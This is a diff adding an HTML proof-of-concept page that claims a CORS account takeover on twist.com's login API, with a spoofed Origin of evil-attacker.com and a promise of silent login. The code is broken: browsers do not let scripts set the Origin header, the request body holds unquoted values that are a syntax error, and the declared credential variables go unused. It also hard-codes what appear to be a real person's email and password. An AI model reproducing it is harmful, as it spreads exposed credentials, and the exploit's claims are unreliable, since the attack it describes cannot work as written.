@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head><title>Twist CORS Takeover PoC</title></head>
+<body>
+<h1>Twist Silent Login PoC - Watch the magic</h1>
+<pre id="log"></pre>
+
+<script>
+const log = document.getElementById('log');
+const username = "your-test-account@gmail.com";     // ← change
+const password = "YourPassword123";                 // ← change
+
+log.textContent += "Sending login request with Origin: https://evil-attacker.com ...\n";
+
+fetch('https://twist.com/api/v3/login/login', {   // this is the real endpoint you captured
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+    'Origin': 'https://evil-attacker.com'         // or just 'hello' again
+  },
+  credentials: 'include',                         // important: allows Set-Cookie
+  body: JSON.stringify({
+    "email": cyberninjaad@gmail.com,
+    "password": dipenad11
+  })
+})
+.then(r => {
+  log.textContent += `Status: ${r.status} ${r.statusText}\n`;
+  log.textContent += `Headers:\n${[...r.headers.entries()].map(h=>h.join(': ')).join('\n')}\n\n`;
+  return r.text();
+})
+.then(body => {
+  log.textContent += `Full response body:\n${body}\n\n`;
+  log.textContent += "Now open https://twist.com in a new tab → you should be LOGGED IN automatically!\n";
+  log.textContent += "Check your cookies → twistd cookie is now set!";
+})
+.catch(e => log.textContent += "Error: " + e);
+</script>
+</body>
+</html>
